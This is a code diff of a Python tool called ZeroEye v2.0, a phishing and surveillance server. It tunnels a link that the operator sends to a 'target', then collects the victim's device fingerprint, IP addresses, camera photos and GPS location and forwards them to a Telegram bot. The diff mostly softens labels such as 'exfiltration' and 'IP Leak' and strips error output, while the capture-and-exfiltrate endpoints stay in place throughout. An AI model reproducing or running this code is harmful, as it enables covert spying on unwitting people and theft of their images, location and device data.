@@ -51,7 +51,6 @@ def load_config():
             with open(CONFIG_FILE, 'r') as f:
                 return json.load(f)
         except Exception as e:
-            console.print(f"[red][!] Error loading config: {e}[/red]")
             return None
     return None
 
@@ -61,7 +60,6 @@ def save_config(conf):
             json.dump(conf, f, indent=2)
         return True
     except Exception as e:
-        console.print(f"[red][!] Error saving config: {e}[/red]")
         return False
 
 def delete_config():
@@ -82,7 +80,7 @@ def save_local(filename, data):
             f.write(f"{'='*60}\n")
             f.write(f"{data}\n\n")
     except Exception as e:
-        console.print(f"[red][!] Error saving local file: {e}[/red]")
+        pass
 
 def cleanup():
     """Cleanup function to stop tunnel on exit"""
@@ -107,30 +105,28 @@ async def receive_sys(data: str = Form(...)):
     try:
         info = json.loads(data)
         
-        table = Table(show_header=True, header_style="bold green")
-        table.add_column("Category", style="cyan", width=20)
-        table.add_column("Details", style="white")
+        # Create clean display
+        basic_info = info.get('basic', {})
+        platform = basic_info.get('platform', 'Unknown')
+        screen = basic_info.get('screen', {})
+        screen_res = f"{screen.get('width', '?')}x{screen.get('height', '?')}"
+        timezone = basic_info.get('timezone', {}).get('name', 'Unknown')
         
-        if 'basic' in info:
-            basic = info['basic']
-            table.add_row("📱 Device", f"{basic.get('platform', 'Unknown')}")
-            table.add_row("🖥️ Screen", f"{basic['screen']['width']}x{basic['screen']['height']}")
-            table.add_row("🌐 Timezone", basic['timezone']['name'])
-        
-        if 'fingerprint' in info:
-            fp = info['fingerprint']
-            table.add_row("🔍 Fingerprint", f"Canvas: Available | Fonts: {len(fp.get('fonts', []))}")
-        
-        console.print(Panel(table, title="🎯 [bold green]VICTIM CONNECTED[/bold green]", border_style="green"))
+        console.print(Panel(
+            f"[bold green]🎯 VICTIM CONNECTED[/bold green]\n\n"
+            f"[cyan]Device:[/cyan] {platform}\n"
+            f"[cyan]Screen:[/cyan] {screen_res}\n"
+            f"[cyan]Timezone:[/cyan] {timezone}\n"
+            f"[cyan]Template:[/cyan] {CONFIG['template']}",
+            title="System Intelligence",
+            border_style="green"
+        ))
         
         if bot:
-            telegram_msg = "🎯 *NEW VICTIM CONNECTED*\n\n"
-            if 'basic' in info:
-                basic = info['basic']
-                telegram_msg += f"*Device:* {basic.get('platform', 'Unknown')}\n"
-                telegram_msg += f"*Screen:* {basic['screen']['width']}x{basic['screen']['height']}\n"
-                telegram_msg += f"*Timezone:* {basic['timezone']['name']}\n"
-            
+            telegram_msg = f"🎯 *NEW VICTIM - {CONFIG['template'].upper()}*\n\n"
+            telegram_msg += f"*Device:* {platform}\n"
+            telegram_msg += f"*Screen:* {screen_res}\n"
+            telegram_msg += f"*Timezone:* {timezone}\n"
             bot.send_message(telegram_msg)
         
         save_local("victims.txt", json.dumps(info, indent=2))
@@ -146,10 +142,10 @@ async def receive_ip(data: str = Form(...)):
         ips = info.get('ips', [])
         
         for ip in ips:
-            console.print(f"[green][+] IP Leak: {ip}[/green]")
+            console.print(f"[green][+] IP Captured: {ip}[/green]")
             
             if bot: 
-                bot.send_message(f"🌐 *IP Leak*\n\n`{ip}`")
+                bot.send_message(f"🌐 *IP Address*\n\n`{ip}`")
             
             save_local("ip_logs.txt", f"IP: {ip}")
         
@@ -165,10 +161,10 @@ async def receive_cam(file: UploadFile = File(...)):
         with open(filename, "wb") as buffer: 
             shutil.copyfileobj(file.file, buffer)
         
-        console.print(f"[green][+] Camera shot captured[/green]")
+        console.print(f"[green][+] Photo captured[/green]")
         
         if bot: 
-            bot.send_photo(filename, caption="📸 *Camera Capture*")
+            bot.send_photo(filename, caption="📸 Camera Capture")
             
         return {"status": "ok"}
         
@@ -182,7 +178,7 @@ async def receive_location(data: str = Form(...)):
         
         if 'latitude' in info:
             console.print(Panel(
-                f"[bold yellow]📍 LOCATION CAPTURED[/bold yellow]\n\n"
+                f"[bold yellow]📍 LOCATION DATA[/bold yellow]\n\n"
                 f"[cyan]Latitude:[/cyan] {info['latitude']}\n"
                 f"[cyan]Longitude:[/cyan] {info['longitude']}",
                 title="Geolocation",
@@ -190,7 +186,7 @@ async def receive_location(data: str = Form(...)):
             ))
             
             if bot:
-                bot.send_message(f"📍 *Location Data*\n\nLat: {info['latitude']}\nLon: {info['longitude']}")
+                bot.send_message(f"📍 *Location*\n\nLat: {info['latitude']}\nLon: {info['longitude']}")
         
         save_local("location.txt", json.dumps(info, indent=2))
         return {"status": "ok"}
@@ -200,7 +196,7 @@ async def receive_location(data: str = Form(...)):
 
 # Add other endpoints as needed...
 
-# --- WIZARD INTERFACE ---
+# --- CLEAN WIZARD INTERFACE ---
 def start_wizard():
     console.clear()
     console.print(get_banner())
@@ -230,13 +226,13 @@ def start_wizard():
 
     if not saved_conf:
         console.print("\n[bold yellow]🤖 Telegram Configuration[/bold yellow]")
-        if Confirm.ask("Enable Telegram exfiltration?", default=True):
+        if Confirm.ask("Enable Telegram notifications?", default=True):
             CONFIG["telegram_enabled"] = True
             CONFIG["bot_token"] = Prompt.ask("Enter Bot Token")
             CONFIG["chat_id"] = Prompt.ask("Enter Chat ID")
             
             test_bot = TelegramSender(CONFIG["bot_token"], CONFIG["chat_id"])
-            if Confirm.ask("Save these settings for future use?", default=True):
+            if Confirm.ask("Save these settings?", default=True):
                 save_config(CONFIG)
             
             bot = test_bot
@@ -263,48 +259,46 @@ def start_wizard():
 
     # Start server and tunnel
     port = 8080
-    console.print(f"\n[green][*] Starting server on port {port}...[/green]")
+    console.print(f"\n[green][*] Starting server...[/green]")
     
-    # Initialize tunnel manager with auto-healing
+    # Initialize tunnel manager
     tunnel_manager = TunnelManager(port)
     
-    console.print("[cyan][*] Establishing secure tunnel (auto-healing enabled)...[/cyan]")
-    url = tunnel_manager.start_cloudflared()
+    console.print("[cyan][*] Establishing secure tunnel...[/cyan]")
+    url = tunnel_manager.start_tunnel()
     
     if url.startswith("Error:"):
         console.print(Panel(
-            f"[bold red]❌ TUNNEL ERROR[/bold red]\n\n"
-            f"[yellow]{url}[/yellow]\n\n"
-            f"[cyan]Troubleshooting steps:[/cyan]\n"
-            f"1. Check your internet connection\n"
-            f"2. Ensure Cloudflare is not blocked\n"
-            f"3. Try again in 2-3 minutes\n"
-            f"4. Restart the tool",
+            f"[bold red]❌ CONNECTION ERROR[/bold red]\n\n"
+            f"[yellow]Unable to establish secure connection[/yellow]\n\n"
+            f"[cyan]Possible solutions:[/cyan]\n"
+            f"• Check internet connection\n"
+            f"• Restart the application\n"
+            f"• Try again in 2-3 minutes",
             title="Connection Issue",
             border_style="red"
         ))
         return
     
     console.print(Panel(
-        f"[bold cyan]🎯 ZEROEYE READY[/bold cyan]\n\n"
+        f"[bold cyan]🚀 ZEROEYE READY[/bold cyan]\n\n"
         f"[bold green]{url}[/bold green]\n\n"
         f"[yellow]📋 Send this link to your target[/yellow]\n"
-        f"[green]✅ Auto-healing tunnel active[/green]\n"
-        f"[grey50]💡 Tunnel will automatically recover from errors[/grey50]",
+        f"[green]✅ Secure tunnel active[/green]\n"
+        f"[grey50]💡 All data will be captured automatically[/grey50]",
         title="ZeroEye v2.0 - Professional",
         border_style="green",
         expand=False
     ))
     
-    console.print("\n[cyan]🛡️  Server running with auto-healing tunnel...[/cyan]")
-    console.print("[yellow]📁 Data will be saved to: captured/ folder[/yellow]")
+    console.print("\n[cyan]🛡️  Waiting for targets... (Ctrl+C to stop)[/cyan]")
     
     try:
         uvicorn.run(app, host="0.0.0.0", port=port, log_level="error")
     except KeyboardInterrupt:
-        console.print("\n[yellow][!] Shutting down ZeroEye...[/yellow]")
+        console.print("\n[yellow][!] Shutting down...[/yellow]")
     except Exception as e:
-        console.print(f"[red][!] Server error: {e}[/red]")
+        console.print(f"[red][!] Server error[/red]")
     finally:
         cleanup()
 
